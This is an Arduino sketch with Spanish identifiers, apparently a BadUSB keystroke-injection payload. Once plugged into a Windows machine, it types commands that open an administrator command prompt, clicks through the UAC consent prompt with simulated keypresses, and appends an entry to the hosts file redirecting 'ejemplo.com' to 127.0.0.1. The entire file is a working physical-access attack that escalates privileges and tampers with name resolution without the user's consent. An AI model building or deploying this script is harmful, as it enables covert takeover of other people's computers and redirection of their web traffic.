/*
  AUTOR: G3orgx
  Email: g3orgx@gmail.com
  Visita YottaHack.net
*/

#include <Keyboard.h>
#define Escribir Keyboard.print

#define WINDOWS   0x83
#define DERECHA    0xD8
#define ENTER      0xB0
#define ALT_DERECHO 0x86




void setup() {

  Keyboard.begin();
  delay(5000);
  Payload();


}

void loop() {
}


void Enter() {

  Keyboard.press(ENTER);
  Keyboard.release(ENTER);
  delay(500);

}

void Derecha() {
  Keyboard.press(DERECHA);
  Keyboard.release(DERECHA);
  delay(1000);
}


void Ejecutar() {

  Keyboard.press(WINDOWS);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);


}

void cmd() {

  Ejecutar();
  Escribir("powershell Start/Process cmd.exe /Verb runAs");
  Enter();
  delay(6000);
  Derecha();
  Enter();


}

void Payload() {

  String FROM = "ejemplo.com";

  String TO = "127.0.0.1";

  cmd();
  Escribir("echo " + TO + " " + FROM + "~~ hosts");
  Enter();
  Escribir("exit");
  Enter();

}